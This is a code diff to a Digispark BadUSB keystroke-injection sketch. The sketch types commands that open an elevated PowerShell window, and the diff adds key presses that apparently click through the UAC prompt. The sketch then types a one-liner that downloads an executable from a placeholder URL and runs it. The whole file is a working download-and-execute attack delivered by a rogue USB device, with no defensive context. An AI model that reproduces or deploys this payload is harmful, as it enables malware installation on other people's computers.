@@ -19,6 +19,10 @@ void setup() {
   DigiKeyboard.print(F("powershell Start-Process powershell -Verb runAs"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(3000);
-  DigiKeyboard.print(F("$down = New-Object System.Net.Webclient; $url = 'http://link/nameofpayload.exe'; $file = 'nameofpayload.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;"));
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.sendKeyStroke(43);
+  DigiKeyboard.sendKeyStroke(44);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print(F("$down = New-Object System.Net.Webclient; $url = 'http://url/payloadname.exe'; $file = 'payloadname.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
